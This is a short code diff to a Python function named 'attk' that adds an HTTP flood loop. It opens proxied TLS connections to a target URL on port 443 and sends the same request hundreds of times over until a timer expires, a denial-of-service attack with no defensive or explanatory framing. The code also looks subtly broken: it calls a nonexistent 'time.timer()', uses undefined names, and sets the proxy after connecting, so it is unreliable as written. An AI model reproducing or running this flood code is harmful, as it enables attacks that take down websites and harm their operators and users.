@@ -15,4 +15,19 @@ def attk(url, timer):
     req += "Sec-Fetch-Dest: document\r\n"
     req += "Upgrade-Insecure-Requests: 1\r\n"
     req += "Connection: Keep-Alive\r\n\r\n"
-    
+    while time.timer() < samayam:
+        try: 
+            s = socks.socksocket()
+            s.connect((str(urlparse(url).netloc), int(443)))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
